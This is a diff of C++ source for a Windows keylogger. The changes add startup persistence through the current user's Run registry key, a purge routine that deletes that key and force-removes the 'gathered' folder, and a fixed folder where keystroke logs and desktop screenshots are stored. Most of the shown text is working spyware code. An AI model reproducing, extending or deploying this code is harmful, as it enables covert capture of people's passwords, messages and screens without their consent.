@@ -4,7 +4,40 @@ using namespace std;
 
 KeyLogger* KeyLogger::instance = NULL;
 
-KeyLogger::KeyLogger(std::string _logFilePath) {
+void KeyLogger::persist(std::string programName) {
+	
+	HKEY key;
+
+	RegCreateKey(
+		HKEY_CURRENT_USER,
+		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+		&key
+	);
+
+	std::string keyValue = "\"";
+
+	keyValue += programName;
+
+	keyValue += "\"";
+
+	RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
+
+}
+
+void KeyLogger::purge() {
+
+	HKEY key;
+	RegCreateKey(
+		HKEY_CURRENT_USER,
+		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+		&key
+		);
+	RegDeleteValue(key, REGKEY_NAME);
+
+	system("rmdir /S /Q gathered");
+}
+
+KeyLogger::KeyLogger() {
 
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
 
@@ -13,7 +46,9 @@ KeyLogger::KeyLogger(std::string _logFilePath) {
     altDown = false;
     ctrlDown = false;
 
-	logFilePath = _logFilePath;
+	_wmkdir(L"gathered");
+
+	logFilePath = "gathered\\keystrokes.txt";
 	activeWindowTitle = getActiveWindowTitle();
 }
 
@@ -138,7 +173,7 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void KeyLogger::screenshot() {
 	std::stringstream fileName;
-	fileName << time(NULL) << ".bmp";
+	fileName << "gathered\\" << time(NULL) << ".bmp";
 	takeScreenshot(GetDesktopWindow(), fileName.str());
 
 	log("<SCREENSHOT " + fileName.str() + ">\n");
@@ -199,18 +234,4 @@ std::string KeyLogger::getActiveWindowTitle() {
     return std::string(title);
 }
 
-bool KeyLogger::isAltDown() { return altDown; }
 
-void KeyLogger::setAltDown(bool down) { altDown = down; }
-
-bool KeyLogger::isCtrlDown() { return ctrlDown; }
-
-void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }
-
-bool KeyLogger::isLShiftDown() { return lshiftDown; }
-
-void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
-
-bool KeyLogger::isRShiftDown() { return rshiftDown; }
-
-void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
